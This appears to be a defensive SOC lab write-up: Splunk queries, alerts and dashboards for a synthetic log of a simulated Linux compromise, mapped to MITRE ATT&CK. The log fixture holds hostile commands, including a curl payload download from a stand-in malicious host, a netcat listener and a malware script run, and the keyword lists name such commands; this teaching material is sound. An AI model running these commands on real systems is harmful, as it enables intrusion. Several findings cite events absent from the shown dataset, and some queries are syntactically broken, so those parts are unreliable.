# Tier-1 SOC Investigation Lab — Overview

This lab simulates a **real-world security incident investigation** using a single log dataset (tier1_lab_25events.log) analyzed in Splunk. The objective is to train a SOC analyst to detect, extract, and correlate suspicious activities across multiple domains of system behavior. Instead of focusing on only one type of log (like auth.log), this lab intentionally combines different types of events—authentication, process activity, network traffic, file changes, and suspicious behavior—into a single timeline. This approach mirrors real enterprise environments where attackers leave traces across multiple layers of the system rather than a single log source.

# Purpose of This Lab

The goal of this lab is to develop the ability to:

- Work with **unstructured log data**

- Extract meaningful fields using SPL (rex)

- Identify **malicious patterns**

- Correlate events into a **complete attack story**

- Think like a **SOC analyst**, not just run queries

# What Each Category Means in This Lab

## Authentication Events

These logs show user login activity, password attempts, and account status changes. They are used to detect unauthorized access attempts such as brute-force attacks, failed password changes, or suspicious logins. In this dataset, events like account_locked, login_success, and password_change_attempt help identify whether attackers are trying to gain or maintain access to the system.

## Process Execution

These events track programs and commands executed on the system. Monitoring process activity helps detect abnormal behavior such as unexpected scripts, unauthorized services, or attacker tools. For example, processes like bash, python3, curl, and nc can indicate both normal operations and malicious activity depending on context, especially when combined with suspicious commands.

## Malware Activity

This category focuses on indicators of malicious software, including payload downloads, suspicious binaries, and script execution. Events such as suspicious_binary_detected, creation of /tmp/malware.sh, and execution via bash or curl suggest that malware may have been introduced and executed on the system.

## Network Connections

These logs show inbound and outbound network activity, including connections to external IPs and scanning behavior. They are critical for identifying command-and-control communication, data exfiltration, or reconnaissance. In this lab, events like port_scan_detected and outbound connections to IPs such as 45.155.205.12 reveal potential attacker communication.

## File Integrity Events

These events track file creation, modification, and deletion attempts. Monitoring file integrity helps detect unauthorized changes to sensitive files, persistence mechanisms, or attempts to hide activity. For example, modification of .ssh/authorized_keys or system binaries like /usr/bin/ssh indicates possible privilege escalation or backdoor installation.

## Privilege / Suspicious Behavior

This category highlights high-risk or abnormal actions that could indicate compromise. These include permission changes (chmod 777), reverse shell activity (nc -lvp 4444), and attempts to delete logs. These behaviors often represent the attacker’s effort to maintain access, escalate privileges, or cover their tracks.

# What This Lab Simulates

This is not random data — it simulates a **complete attack chain**:

1.  Initial access (login activity)

2.  Execution (processes like bash, python, nc)

3.  Persistence (SSH key modification)

4.  Command & Control (outbound connection)

5.  Privilege abuse (chmod, root actions)

6.  Defense evasion (log deletion attempt)

Dataset for the file “Tier1_Lab_25events.log”

Top of Form

Bottom of Form

2026-04-18T13:25:33Z host=kali user=root action=account_locked reason="multiple failed logins"\
2026-04-18T13:24:55Z host=kali network action=failed_dns_lookup domain="weird-domain.xyz"\
2026-04-18T13:23:44Z host=kali process=unknown action=suspicious_binary_detected path="/tmp/.hidden"\
2026-04-18T13:22:33Z host=kali file="/home/alice/.ssh/authorized_keys" action=file_modified user=alice\
2026-04-18T13:21:55Z host=kali process=python3 action=process_start user=alice cmd="python3 -m http.server 9000"\
2026-04-18T13:20:44Z host=kali network action=port_scan_detected src_ip=172.16.0.88\
2026-04-18T13:19:21Z host=kali user=bob action=password_change_attempt result=failed\
2026-04-18T13:18:55Z host=kali process=systemd action=service_restart service=ssh\
2026-04-18T13:17:12Z host=kali registry=none action=simulated_registry_event key="HKLM\\Software\\Test" value="abc123"\
2026-04-18T13:16:44Z host=kali file="/usr/bin/ssh" action=file_modified user=root\
2026-04-18T13:15:33Z host=kali process=curl action=process_start user=alice cmd="curl http://malicious.example.com/payload"\
2026-04-18T13:14:55Z host=kali process=bash action=command_executed user=charlie cmd="bash /tmp/malware.sh"\
2026-04-18T13:13:44Z host=kali file="/tmp/malware.sh" action=file_created user=charlie\
2026-04-18T13:12:21Z host=kali process=nc action=process_start user=charlie cmd="nc -lvp 4444"\
2026-04-18T13:11:55Z host=kali user=charlie action=login_success src_ip=10.0.0.22\
2026-04-18T13:10:44Z host=kali network action=outbound_connection dst_ip=45.155.205.12 dst_port=4444 protocol=tcp\
2026-04-18T13:09:33Z host=kali network action=outbound_connection dst_ip=8.8.8.8 dst_port=53 protocol=udp\
2026-04-18T13:08:55Z host=kali process=bash action=command_executed user=root cmd="chmod 777 /tmp/run.sh"\
2026-04-18T13:07:44Z host=kali process=python3 action=process_start user=alice cmd="/usr/bin/python3 backup.py"\
2026-04-18T13:06:12Z host=kali file="/var/log/auth.log" action=file_delete_attempt user=bob

Step — 1 Confirm data\
\
index=main source="/var/log/tier1_lab_25events.log"

\| table \_time host source sourcetype \_raw

This SPL query proves:

Data is indexed\
Fields exist\
Events are readable\
———————————————————————————————————————

### Step — 2 Extract field\
\
index=main source="/var/log/tier1_lab_25events.log"

### \| rex "user=(?\<user\>\S+)"

### \| rex "action=(?\<action\>\S+)"

### \| rex "src_ip=(?\<src_ip\>\[0-9\\\]+)"

### \| rex "dst_ip=(?\<dst_ip\>\[0-9\\\]+)"\
\| rex "process=(?\<process\>\S+)\
\| rex "file=\\(?\<file\>\[^\\\]+)\\"\
\| table \_time user action src_ip dst_ip process file \_raw\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
This SPL query is used to transform raw, unstructured log data into structured, analyst-friendly fields so that meaningful security analysis can be performed efficiently. In this dataset, the original events are simple text strings that contain key information such as user names, actions, IP addresses, processes, and file paths, but Splunk does not automatically extract all of these fields because the log is not fully normalized. By using multiple rex commands, the query applies regular expressions to parse and extract important attributes like user, action, src_ip, dst_ip, process, and file directly from the raw event data. This allows the analyst to convert messy log lines into a clean tabular format using the table command, making it much easier to read, filter, and correlate activity across events.

The purpose of this query is to enable visibility into different types of system and security activities within a single unified view. Instead of manually reading each raw log line, the analyst can quickly identify patterns such as which users are involved, what actions are being performed, which processes are executed, and whether any network communication or file modifications are occurring. From the output, we can observe several important security-relevant behaviors: for example, the account_locked action for the root user indicates multiple failed login attempts, suggesting a possible brute-force attack; the login_success event for user charlie from IP 10.0.0.22 shows a successful authentication that could be legitimate or part of an intrusion; the presence of processes like nc (netcat), curl, and bash executing commands such as nc -lvp 4444 and downloading payloads strongly suggests malicious activity such as reverse shells or command-and-control behavior; file-related events like the creation of /tmp/malware.sh and modification of sensitive files like /home/alice/.ssh/authorized_keys and /usr/bin/ssh indicate potential persistence mechanisms or system tampering; and outbound connections to external IPs like 45.155.205.12 highlight possible data exfiltration or attacker communication.

Overall, this query reveals a full picture of system activity across multiple domains—authentication, process execution, network behavior, and file integrity—by structuring the data in a way that supports investigation and correlation. It is a foundational step in any SOC workflow because it bridges the gap between raw log ingestion and actionable threat detection, allowing analysts to quickly identify suspicious patterns, trace attacker behavior, and build a timeline of events without relying solely on raw, unparsed logs.\
———————————————————————————————————————\
Step — 3 Authentication Events\
\
index=main source="/var/log/tier1_lab_25events.log"\
("login" OR "password" OR "account_locked")\
\| stats count by user action\
\| sort – count\
\
This query focuses on authentication activity to identify suspicious login behavior by filtering events related to logins, passwords, and account lockouts. It aggregates the data using stats count by user action, allowing the analyst to quickly see how many times each user performed actions such as login_success, login_failed, password_change_attempt, and account_locked. The output reveals patterns like users experiencing both failed and successful logins, which may indicate brute-force or credential guessing attempts, and highlights critical events such as the root account being locked, suggesting repeated unauthorized access attempts against a high-privilege account. Overall, this query provides a clear summary of authentication behavior, helping the analyst quickly detect anomalies and prioritize potential security incidents for further investigation.\
————————————————————————————————————---\
\
Step — 4 Process Execution\
\
index=main source="/var/log/tier1_lab_25events.log"\
\| rex "process=(?\<process\>\S+)"\
\| search process=\*\
\| stats count by process\
\| sort – count\
\
Or\
\
index=main source="/var/log/tier1_lab_25events.log"\
\| rex "process=(?\<process\>\S+)"\
\| search process=\*\
\| stats count by process\
\| sort - count\
\
This query is used to analyze process execution activity within the dataset by extracting the process field from raw log events and summarizing how frequently each process is executed. Since the log file is unstructured, the rex command is applied to parse and create a usable process field directly from the raw data, enabling structured analysis. The search process=\* filter ensures that only events containing process information are included, and the stats count by process command aggregates the number of occurrences for each process, while sort - count highlights the most frequent processes at the top. The output reveals both normal and potentially suspicious system activity: processes like bash and python3 may represent legitimate usage but can also be abused during attacks, whereas tools such as curl suggest external payload downloads and nc (netcat) is a strong indicator of possible reverse shell or unauthorized network access. The presence of systemd indicates service-level activity, and any unknown or unusual process names may point to hidden or malicious binaries. Overall, this query helps the analyst quickly identify which processes are most active and distinguish between normal operations and behaviors that may indicate compromise, making it a key step in detecting execution-based threats within a SOC investigation. So in summary, This SPL query Detect bash, python3, curl, nc (suspicious)\
————————————————————————————————————--\
\
Step — 5 Malware Activity\
\
index=main source="/var/log/tier1_lab_25events.log"\
("malware" OR "suspicious_binary" OR "payload")\
\| table \_time host user action process file \_raw\
\
This query is used to investigate malware-related activity by filtering the log file for suspicious keywords such as malware, suspicious_binary, and payload. The output reveals several important indicators of compromise: an unknown process detected as a suspicious binary in /tmp/.hidden, a curl process run by alice that attempts to download a payload from a malicious URL, a bash command executed by charlie to run /tmp/malware.sh, and the creation of the suspicious file /tmp/malware.sh. Together, these events suggest a possible malware infection chain where a payload is downloaded, a malicious script is created, and then executed. This query is important in a SOC investigation because it helps analysts quickly isolate malware indicators from the larger dataset and understand how suspicious files, commands, and processes may be connected during an attack.\
————————————————————————————————————---\
\
Step — 6 Network Connections\
\
\
index=main source="/var/log/tier1_lab_25events.log" network\
\| rex "action=(?\<action\>\S+)"\
\| rex "src_ip=(?\<src_ip\>\[0-9\\\]+)"\
\| rex "dst_ip=(?\<dst_ip\>\[0-9\\\]+)"\
\| fillnull value="N/A" src_ip dst_ip\
\| stats count by action src_ip dst_ip\
\| sort – count\
\
Or\
\
index=main source="/var/log/tier1_lab_25events.log"\
network\
\| rex "dst_ip=(?\<dst_ip\>\[0-9\\\]+)"\
\| stats count by src_ip dst_ip action\
\
\
\
\
\
This shows network-related activity in the dataset by grouping events based on the type of action and the IP addresses involved, allowing the analyst to quickly understand what kind of network behavior occurred during the timeline. Each row represents a distinct network event type: the failed_dns_lookup with N/A values indicates that the system attempted to resolve a domain name (in this case likely the suspicious domain from the raw logs) but failed, which can be an early sign of malware trying to contact a command-and-control domain that is unreachable or blocked. The two outbound_connection events show that the system initiated connections to external IP addresses, including 8.8.8.8 (a common public DNS server, typically benign) and 45.155.205.12, which is more suspicious because it is an unknown external IP and could represent attacker infrastructure or data exfiltration. The port_scan_detected event with source IP 172.16.0.88 indicates reconnaissance activity, where a system is probing ports to discover open services, which is often a precursor to an attack. The N/A values appear because not all network events include both source and destination IP fields—for example, a port scan may only log the scanning source, while an outbound connection logs only the destination—so fillnull ensures those missing fields are still visible. Overall, this output reveals a mix of reconnaissance, external communication, and suspicious DNS behavior, helping the analyst identify potential attacker activity and prioritize further investigation into unknown IP addresses and abnormal network patterns.\
————————————————————————————————————---\
\
Step — 7 File Integrity Activity\
\
index=main source="/var/log/tier1_lab_25events.log"\
\| rex "file=\\(?\<file\>\[^\\\]+)\\"\
\| rex "action=(?\<action\>\S+)"\
\| rex "user=(?\<user\>\S+)"\
\| search file=\*\
\| stats count by file action user\
\| sort - count

This SPL query shows file integrity activity by showing which files were accessed or modified, what action was performed, and which user was responsible, allowing the analyst to quickly identify both normal and suspicious behavior. For example, /etc/passwd being read by *alice* is typically a normal system operation, as this file stores user account information and is often accessed by legitimate processes. However, more critical events appear in the rest of the output: the modification of /home/alice/.ssh/authorized_keys suggests a potential persistence mechanism where an attacker could add their own SSH key to maintain access without needing a password; the creation of /tmp/malware.sh by *charlie* is a strong indicator of malware staging, especially since /tmp is commonly used by attackers for temporary malicious scripts; the modification of the system binary /usr/bin/ssh by *root* is highly suspicious and could indicate tampering with a core service to introduce a backdoor; and the attempted deletion of /var/log/auth.log by *bob* suggests an effort to erase evidence of unauthorized activity, which is a classic defense evasion technique. Overall, this output reveals a combination of benign and high-risk file activities, helping the analyst identify potential compromise, persistence mechanisms, privilege abuse, and attempts to hide malicious actions within the system.\
This query analyzes file integrity events by extracting file paths, actions, and associated users from raw log data using the rex command. Since the dataset is unstructured, field extraction is required to identify file-related activity. The query then filters only events where a file is present and aggregates them using stats count by file action user, allowing the analyst to observe how files are being created, modified, or targeted for deletion. The output reveals critical security events such as the creation of a malicious script (/tmp/malware.sh), modification of sensitive files like SSH authorized keys and system binaries, and attempts to delete log files. These activities are strong indicators of attacker behavior, including persistence, privilege abuse, and defense evasion, making this query essential for detecting file-based threats in a SOC investigation.\
This output highlights **file integrity activity** by showing which files were accessed or modified, what action was performed, and which user was responsible, allowing the analyst to quickly identify both normal and suspicious behavior. For example, /etc/passwd being read by *alice* is typically a normal system operation, as this file stores user account information and is often accessed by legitimate processes. However, more critical events appear in the rest of the output: the modification of /home/alice/.ssh/authorized_keys suggests a potential persistence mechanism where an attacker could add their own SSH key to maintain access without needing a password; the creation of /tmp/malware.sh by *charlie* is a strong indicator of malware staging, especially since /tmp is commonly used by attackers for temporary malicious scripts; the modification of the system binary /usr/bin/ssh by *root* is highly suspicious and could indicate tampering with a core service to introduce a backdoor; and the attempted deletion of /var/log/auth.log by *bob* suggests an effort to erase evidence of unauthorized activity, which is a classic defense evasion technique. Overall, this output reveals a combination of benign and high-risk file activities, helping the analyst identify potential compromise, persistence mechanisms, privilege abuse, and attempts to hide malicious actions within the system.\
\
————————————————————————————————————---\
\
Step — 8 Suspicious Behavior\
\
index=main source="/var/log/tier1_lab_25events.log"\
("chmod 777" OR "nc -lvp" OR "curl" OR "malware")\
\| table \_time user action \_raw\
\
This query is designed to detect high-risk and suspicious behavior by searching for specific command patterns and keywords that are commonly associated with attacker activity, such as chmod 777, nc -lvp, curl, and malware. Instead of extracting fields, this query focuses on identifying dangerous actions directly from the raw logs, which is a practical SOC technique when looking for known malicious indicators. The output reveals a clear sequence of potentially malicious operations: first, *alice* uses curl to download a payload from a suspicious external source, indicating possible malware delivery; then *charlie* creates a file /tmp/malware.sh, which suggests staging of a malicious script; shortly after, *charlie* executes that script using bash, confirming execution of the payload; the use of nc -lvp 4444 shows that *charlie* started a netcat listener, which is a strong indicator of a reverse shell or backdoor waiting for a connection; and finally, the chmod 777 command executed by *root* changes file permissions to be fully open, which is highly risky and often used by attackers to ensure their malicious files can be executed without restriction.

Overall, this query reveals a coordinated chain of attacker behavior, including payload download, file creation, execution, backdoor setup, and permission modification. It is important because it allows the analyst to quickly isolate critical security events that indicate compromise, privilege abuse, and persistence, making it a key step in identifying and understanding malicious activity in a SOC investigation.\
————————————————————————————————————

Step — 9 Full Attack Timeline\
\
index=main source="/var/log/tier1_lab_25events.log"\
\| sort \_time\
\| table \_time user action process file src_ip dst_ip \_raw\
\
\
\
This query reconstructs the **full attack timeline** by sorting all events in chronological order and displaying key fields such as user, action, process, file, and IP addresses, allowing the analyst to understand the sequence of events as they actually occurred on the system. The purpose of this query is to move beyond isolated detections and build a **complete narrative of the attack**, which is one of the most important skills in a SOC investigation. From the output, we can observe a progression of activity that suggests a multi-stage compromise: the timeline begins with normal and failed authentication attempts, including successful logins by *alice* and later *charlie*, alongside failed attempts from external IPs, indicating possible reconnaissance or credential probing. Shortly after, there is a privilege_escalation_attempt involving the root account, which signals an attempt to gain higher-level access. This is followed by suspicious file activity, including reading /etc/passwd (user enumeration) and an attempt to delete /var/log/auth.log, which strongly suggests an effort to remove evidence. The activity then escalates into execution and persistence behaviors, where processes like python3, bash, and curl are used, permissions are loosened with chmod 777, and outbound network connections are established, including one to an unknown external IP (45.155.205.12), indicating possible command-and-control communication. The attack becomes more explicit when *charlie* logs in successfully and initiates a netcat listener (nc -lvp 4444), creates a malicious script (/tmp/malware.sh), and executes it, clearly demonstrating backdoor setup and malware execution. Finally, critical system modifications occur, such as altering /usr/bin/ssh, restarting the SSH service, and performing additional suspicious actions like password change attempts and port scanning, which may indicate persistence, lateral movement, or continued reconnaissance. Overall, this timeline reveals a coordinated attack lifecycle that includes initial access, privilege escalation, defense evasion, execution, persistence, and network communication, providing a complete picture of how the system may have been compromised.\

\
Create Alerts 

We will create 4 real alerts from your dataset:

Brute Force / Account Lock\
Malware Activity\
Suspicious Network Connection\
Privilege / Suspicious Behavior\
\
Alert 1 — Brute Force / Account Lock

index=main source="/var/log/tier1_lab_25events.log"\
("login_failed" OR "account_locked")\
\| stats count by user src_ip action\
\| where count \>= 1\
\
This query is used to identify **failed authentication attempts that may indicate brute-force or unauthorized access activity** by filtering events related to login_failed and account_locked, then grouping them by user, source IP address, and action. The output reveals which users experienced failed login attempts and from which IP addresses those attempts originated, providing immediate visibility into potentially suspicious behavior. In this case, the results show that both *bob* and *charlie* had failed login attempts coming from different external IPs (192.168.1.44 and 185.22.14.9), which could indicate credential guessing or probing activity against multiple accounts. Even though the count is low in this dataset, in a real SOC environment repeated occurrences or patterns across users and IPs would strongly suggest a brute-force attack or malicious access attempt. Overall, this output helps analysts quickly detect and investigate abnormal authentication behavior before it escalates into a successful compromise.\
\
Save as Alert\
\
\
\

It detects Failed logins, Account lockout which indicates brute-force attack

———————————————————————————————————————————\
Malware Detections\
\
index=main source="/var/log/tier1_lab_25events.log"\
("malware" OR "suspicious_binary" OR "payload")\
\| table \_time host user action process file \_raw\
\
\
Save as Alert **:** Scheduled\
\
\
\
Suspicious_binary_detected\
————————————————————————————————————————-\
Suspicious network activity\
\
index=main source="/var/log/tier1_lab_25events.log"\
network\
\| rex "action=(?\<action\>\S+)"\
\| rex "dst_ip=(?\<dst_ip\>\[0-9\\\]+)"\
\| search dst_ip=\*\
\| stats count by action dst_ip\
\| where dst_ip!="8.8.8.8"\
\| sort – count\
\
This query identifies:\
Outbound connections to external IPs\
Suspicious communication (possible C2)\
Port scanning behavior\
45.155.205.12 ⚠️ (unknown external IP)\
Excludes 8.8.8.8 (normal DNS)\
outbound_connection → 45.155.205.12\
Possible attacker communication\
Reconnaissance activity\
\
Save as Alert\

———————————————————————————————————————————\
Suspicious Command / Privilege Behavior\
\
index=main source="/var/log/tier1_lab_25events.log"

("chmod 777" OR "nc -lvp" OR "sudo su" OR "privilege_escalation" OR "curl" OR "malware")

\| table \_time user action process \_raw\
\

Using keyword-based detection in Splunk\
"nc -lvp 4444"\
\
index=main source="/var/log/tier1_lab_25events.log"\
("chmod 777" OR "nc -lvp 4444" OR "sudo su" OR "curl" OR "malware")\
\| table \_time user action process \_raw\
\
\
This alert helps identify attacker behavior such as trying to escalate privileges with sudo su, changing permissions with chmod 777, downloading payloads with curl, executing malware scripts, or starting a suspicious netcat listener with nc -lvp 4444.\
\
This alert helps identify attacker behavior such as trying to escalate privileges with sudo su, changing permissions with chmod 777, downloading payloads with curl, executing malware scripts, or starting a suspicious netcat listener with nc -lvp 4444.\
"nc -lvp 4444" → matches exact reverse shell command

"chmod 777" → detects permission abuse

"sudo su" → privilege escalation attempt

"curl" → payload download\
"malware" → malicious file/script\
———————————————————————————————————————\
Create Dashboard Visualization\
\
Panel 1 — Total Events\
index=main source="/var/log/tier1_lab_25events.log"

\| stats count as total_events\
\
\
The output shows 25 events are indexed.\
————————————————————————————————————---\
Panel 2 — Authentication Activity\
\
index=main source="/var/log/tier1_lab_25events.log"

(action="login_failed" OR action="login_success" OR action="account_locked" OR action="password_change_attempt")

\| fillnull value="N/A" src_ip

\| stats count by user src_ip action

\| sort – count\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
This panel correlates user activity, source IP addresses, and authentication outcomes to identify suspicious login behavior. It shows successful logins for *alice* (10.0.0.5) and *charlie* (10.0.0.22), while failed login attempts for *bob* (192.168.1.44) and *charlie* (185.22.14.9) suggest possible credential guessing. The *root* account being locked indicates repeated failed attempts against a privileged account, which is a strong sign of brute-force activity. Overall, this panel helps detect unauthorized access attempts and abnormal authentication patterns.\
\
Authentication events\
\
index=main source="/var/log/tier1_lab_25events.log"\
("login" OR "password" OR "account_locked")\
\| stats count by user action\
\| sort – count\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
———————————————————————————————————————————\
Panel 3 — Process Execution\
\
index=main source="/var/log/tier1_lab_25events.log"

\| rex "process=(?\<process\>\S+)"

\| search process=\*\
\| stats count by process\
\| sort – count\
\
\
\
\
bash → normal, but used for malicious scripts\
python3 → scripting (can be abused)\
curl → **payload download** ⚠️\
nc → **reverse shell / backdoor** ⚠️\
systemd → service restart\
This helps identify **execution-based attack behavior\**
This panel analyzes process execution activity by extracting process names from raw log data and counting how frequently each process is executed. It provides visibility into both normal and potentially suspicious processes running on the system. While processes such as bash and python3 may represent legitimate operations, they can also be used by attackers to execute scripts. More notably, the presence of curl indicates possible payload download activity, and nc (netcat) is a strong indicator of reverse shell or backdoor behavior. By summarizing process activity, this panel helps analysts detect abnormal execution patterns and identify processes commonly associated with malicious activity.\
———————————————————————————————————————\
Panel 4 — Malware Activity\
\
index=main source="/var/log/tier1_lab_25events.log"\
("malware" OR "suspicious_binary" OR "payload")\
\| table \_time user action process file \_raw\
\
\
\
suspicious_binary_detected\
curl downloading payload\
bash executing malware script\
/tmp/malware.sh being created

————————————————————————————————————————--\
Panel 5 — Network Activity\
\
index=main source="/var/log/tier1_lab_25events.log"\
network\
\| rex "action=(?\<action\>\S+)"\
\| rex "src_ip=(?\<src_ip\>\[0-9\\\]+)"\
\| rex "dst_ip=(?\<dst_ip\>\[0-9\\\]+)"\
\| fillnull value="N/A" src_ip dst_ip\
\| stats count by action src_ip dst_ip\
\| sort – count\
\
failed_dns_lookup → N/A / N/A

outbound_connection → N/A / 45.155.205.12

outbound_connection → N/A / 8.8.8.8

port_scan_detected → 172.16.0.88 / N/A\
\
This query output means:\
45.155.205.12 → suspicious external IP (possible C2)\
8.8.8.8 → normal DNS

172.16.0.88 → internal port scan\
\
It shows:\
Reconnaissance

External communication

ossible attacker activity\
\
\
\
This panel analyzes network-related events by extracting source and destination IP addresses along with network actions such as outbound connections, DNS failures, and port scanning. It provides visibility into communication patterns and helps identify suspicious behavior, including connections to unknown external IP addresses and internal reconnaissance activity.\
————————————————————————————————————————---\
Panel 6 — File Integrity Events\
\
index=main source="/var/log/tier1_lab_25events.log"

\| rex "file=\\(?\<file\>\[^\\\]+)\\"

\| rex "action=(?\<action\>\S+)"

\| rex "user=(?\<user\>\S+)"

\| search file=\*

\| stats count by file action user

\| sort - count

\
/etc/passwd read → normal (user enumeration)\
.ssh/authorized_keys modified → persistence\
/tmp/malware.sh created → malware staging\
/usr/bin/ssh modified → system tampering / backdoor\
/var/log/auth.log delete attempt → log tampering / defense evasion\
This panel is very critical for detecting compromise\
\
This panel analyzes file-related activity by extracting file paths, actions, and associated users from raw log data. It highlights critical operations such as file creation, modification, deletion attempts, and access to sensitive system files. The output reveals potential indicators of compromise, including unauthorized modification of SSH keys for persistence, creation of malicious scripts, system binary tampering, and attempts to delete log files, which are commonly associated with attacker behavior.\
————————————————————————————————————---\
Panel 7 — Suspicious Command / Privilege Behavior\
\
index=main source="/var/log/tier1_lab_25events.log"\
("chmod 777" OR "nc -lvp 4444" OR "sudo su" OR "curl" OR "malware")\
\| table \_time user action process \_raw\
\
sudo su → privilege escalation attempt

chmod 777 → dangerous permission change\
curl → payload download\
nc -lvp 4444 → possible reverse shell or backdoor listener\
bash /tmp/malware.sh → malware execution\
\

\
The panel uses a table visualization to display detailed command execution and privilege-related activity, allowing analysts to inspect exact commands and raw logs. This is essential for identifying suspicious behavior such as reverse shell execution, permission abuse, and privilege escalation attempts, which cannot be effectively analyzed using aggregated chart visualizations.\
———————————————————\
\
Panel 8 — Full Attack Timeline\
\
index=main source="/var/log/tier1_lab_25events.log"\
\| sort \_time\
\| table \_time user action process file src_ip dst_ip \_raw\
\
\
\
There are 25 events and 6 of them have been screenshotted.\
\
This panel shows the entire attack in chronological order\
Authentication events\
Process execution\
Malware activity\
Network connections\
File changes\
\
These are step by step attacks by users:\
\
\
=============================================================================================================================================================================================================================================================================================================================================================================================

1.  Total Events

2.  Authentication

3.  Process Execution

4.  Malware

5.  Network

6.  File Integrity

7.  Suspicious Commands

8.  Attack Timeline

**alice**: successful login, file read /etc/passwd, python3 process, and curl payload download.

**bob**: failed login, attempted deletion of /var/log/auth.log, and failed password change attempt.

**charlie**: failed login, later successful login, nc -lvp 4444 backdoor/listener, creation of /tmp/malware.sh, and execution of malware with bash.

root: privilege escalation attempt, chmod 777 /tmp/run.sh, account lockout, and modification of /usr/bin/ssh.\
network / unknown source: outbound connection to 45.155.205.12, failed DNS lookup, and port scan from 172.16.0.88.\
\
\
This panel reconstructs the complete sequence of events by displaying all log entries in chronological order. It enables analysts to trace the full attack lifecycle, from initial access and failed login attempts to privilege escalation, malware execution, network communication, and system modification. By correlating multiple types of activity in a single timeline, this panel provides a comprehensive view of the incident and supports effective investigation and response.\
———————————————————\
\
**Panel 9- MITRE ATT&CK Mapping** 
============================================================================================================================================================================================================================================================================================================================================================================================================================================================================================

What is MITRE ATT&CK: MITRE ATT&CK® is a globally accessible, free knowledge base of cyber adversary behaviors, tactics, and techniques based on real-world observations. It acts as a standardized framework (Adversarial Tactics, Techniques, and Common Knowledge) used by security teams to model threats, enhance detection, and test defenses against specific attacker methods, such as phishing or ransomware. 

**Core Components of ATT&CK**

**Tactics (The "Why"):** The adversary's tactical goal—what they are trying to achieve (e.g., initial access, lateral movement, or data exfiltration).

**Techniques (The "How"):** The specific methods used to achieve a tactic (e.g., using valid accounts to gain access).

**Procedures (TTPs):** The specific, actionable steps a threat actor takes.\
\
So SOC analysts use it to Classify attacks , to Understand tactics, and to improve detection.\
\
\
\
index=main source="/var/log/tier1_lab_25events.log"\
\| eval technique=case(\
like(\_raw,"%login_failed%") OR like(\_raw,"%account_locked%"), "T1110 Brute Force",\
like(\_raw,"%sudo su%"), "T1068 Privilege Escalation",\
like(\_raw,"%/etc/passwd%"), "T1087 Account Discovery"\
like(\_raw,"%auth.log%"), "T1070 Indicator Removal",\
like(\_raw,"%chmod 777%") OR like(\_raw,"%bash%"), "T1059 Command Execution",\
like(\_raw,"%port_scan%"), "T1046 Network Scanning",\
like(\_raw,"%curl%") OR like(\_raw,"%payload%"), "T1105 Ingress Tool Transfer",\
like(\_raw,"%nc -lvp%"), "T1059 Command & Control",\
like(\_raw,"%authorized_keys%"), "T1098 Persistence",\
like(\_raw,"%/usr/bin/ssh%"), "T1554 System Binary Modification"\
)\
\| stats count by technique\
\| sort – count\
\
This query maps raw log events to MITRE ATT&CK techniques by using conditional logic to match known attack patterns within log data. It translates detected activities such as failed logins, command execution, malware download, and network scanning into standardized MITRE techniques, providing a structured view of attacker behavior and improving understanding of the attack lifecycle.


\
===================================================================================================================================================================

| **Splunk Detection** | **Interpretation**  | **MITRE** |
|----------------------|---------------------|-----------|
| login_failed         | brute force attempt | T1110     |
| curl payload         | malware download    | T1105     |
| nc -lvp              | reverse shell       | T1059     |
| chmod 777            | suspicious command  | T1059     |
| auth.log delete      | hide evidence       | T1070     |

**Final Summary Table**

| **Activity**            | **Technique** | **Tactic**           |
|-------------------------|---------------|----------------------|
| Failed Login            | T1110         | Credential Access    |
| Privilege Escalation    | T1068         | Privilege Escalation |
| File Enumeration        | T1087         | Discovery            |
| Log Deletion            | T1070         | Defense Evasion      |
| Command Execution       | T1059         | Execution            |
| Port Scan               | T1046         | Discovery            |
| Malware Download        | T1105         | Command & Control    |
| Reverse Shell           | T1059         | Command & Control    |
| SSH Key Modification    | T1098         | Persistence          |
| System Binary Tampering | T1554         | Persistence          |

The observed activities were mapped to the MITRE ATT&CK framework to classify attacker behavior across different stages of the attack lifecycle. This mapping includes techniques such as brute-force authentication attempts, privilege escalation, command execution, malware delivery, persistence mechanisms, and command-and-control communication. By aligning detected events with MITRE ATT&CK tactics and techniques, the analysis provides a structured understanding of the attack and demonstrates how multiple stages of compromise are connected within a real-world security incident.\
\
\

Bottom of Form

Top of Form

Bottom of Form

### \
\
\
\
\
\
\
\
\
\
\
\
